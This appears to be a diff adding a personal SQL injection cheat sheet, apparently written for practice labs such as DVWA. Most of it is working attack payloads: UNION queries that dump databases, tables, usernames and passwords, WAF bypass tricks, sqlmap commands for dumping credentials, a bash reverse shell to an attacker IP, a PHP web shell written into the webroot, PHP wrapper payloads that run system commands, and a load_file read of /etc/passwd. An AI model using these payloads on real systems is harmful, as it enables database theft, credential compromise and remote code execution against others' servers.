@@ -1,0 +1,90 @@
+# Find total number of vulnerable columns
+
+ -1' order by 1,2,n
+ ' union select 1,2,3,n
+
+# Dump_db
+
+   admin' or 1=1 #
+ ' union select 1,2,database() //[database_NAME]
+ ' union select 1,2,version()
+ ' union select 1,2,user()
+ ' union select 1,2,@@version
+ 'union select 1,group_concat(table_name) from information_schema.tables where table_schema='dvwa';--+ [table_name]
+ 'union select 1,group_concat(column_name) from information_schema.columns where table_name='users';--+ [all_columns]
+ 'union+select+user,password+from+users--+ [user&password]
+ 'union select 1,substring(version(),1,1)=1 [Blind_Boolean_based]
+
+# WAF ByPassing
+
+ * ' or 1=1 --
+ * or 2>1 -- [still TRUE]
+ * ' or 'hulk'> 'a' [still TRUE ]
+ * '/*12345order*/ by 2 #
+ * url encode or hex encode or base64  [encodeing..]
+ * EXEC('SELE'+'CT')  [select]
+ * union          select  [union select]
+ *'/**/or/**/1/**/=/**/1/**/--
+
+# SQlMAP
+
+ - sqlmap -u <URL> --data= <POST string> -p <injection_Parameter> --[options] ```POST```
+ - sqlmap -r <req.txt> -p <injection_Parameter> --[options]```POST```
+ - sqlmap -u <URL> -p <injection_Parameter> --[options] ```GET```
+
+
+ - sqlmap -r request.txt -p email --level 5 --risk 3 --batch --threads 10 --dbs
+
+
+ - sqlmap -r request.txt -p email --level 5 --risk 3 --threads 10 -D database_name --tables
+
+
+
+ [options]
+
+      --technique=U,B [union_based],[Blind_Boolean_based]
+      --dbms=MySql
+      --banner [os,info..]
+      --users [dump_users]
+      --is-dba [check db admin?..]
+      --dbs [all_databases..]
+      -D <database> --tables [dump_tables...]
+      -D <database> - T db_table_name --columns [dump_columns..]
+      -D <database> - T db_table_name -C columns_name --dump [dump_username,password..]
+
+      -Os-Shell {bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"}
+
+ ### RCE
+
+ 'union select 1,@@datadir,3,4 --   {Path}
+ 'union select 1,'<?php system($_GET["cmd"]); ?>',3,4 intooutfile 'C:\\xampp\\htdocs\\rce.php' --
+ then ...  127.0.0.1/rce.php?cmd=time
+
+ ’ /*!50000union*/ select 1,2,3,4,5,’../index’,7,8,’php://filter/convert.base64-encode/resource=.’ -- -
+ ' /*!50000union*/ select 1,2,3,4,5,6,7,8,’data://text/plain,<?php echo system(“uname -a”);?>’-- -
+ ' /*!50000union*/ select 1,2,3,4,5,6,7,8,’data://text/plain,<?php $a=”sy”;$b=”stem”;$c=$a.$b; $c(“uname -a”);?>’ -- -
+
+ ###LFI
+
+ ' UNION SELECT load_file('/etc/passwd') #
+
+__NOTE__
+
+ * Burp
+     - Fuzzing payloads !
+     - Exploitation
+
+ * sqlNinja
+     - MS-SQL-server
+     - Privilege escaltion techniques
+
+ * Havij
+     - Windows GUI
+     - No longer updated
+
+ * Netsparker
+ -------------------------------------------------------------------------
+ #$#portswigger
+ https://portswigger.net/web-security/sql-injection/cheat-sheet
+ =========================================================================
+ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
